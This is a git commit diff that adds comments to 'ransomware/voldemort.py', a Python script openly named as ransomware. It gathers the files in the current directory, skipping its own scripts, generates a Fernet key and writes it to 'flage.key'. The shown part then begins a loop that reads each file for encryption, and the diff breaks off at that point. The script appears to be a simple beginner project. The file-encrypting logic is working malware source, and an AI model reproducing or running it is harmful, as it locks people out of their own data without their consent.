f4f95d224cab426b6fc589197411273226c54323
Mark miller <youneszah2010@gmail.com>
2026-03-29 14:04:20 +0100

    Implement key generation and file encryption logic
    Add functionality to generate and save encryption key for files.

--- ransomware/voldemort.py
+++ ransomware/voldemort.py
@@ -1,18 +1,19 @@
+#crypting
 import os
 from cryptography.fernet import Fernet
-
+#files well not crypet
 files = []
 for file in os.listdir():
     if file in ["voldemort.py", "decrypted.py", "flage.key"]:
         continue
     if os.path.isfile(file):
         files.append(file)
-
+# generate a key 
 key = Fernet.generate_key()
-
+#put the key on falge.key
 with open("flage.key", "wb") as flage:
     flage.write(key)
-
+#crypet
 for file in files:
     with open(file, "rb") as thefile:
         contents = thefile.read()
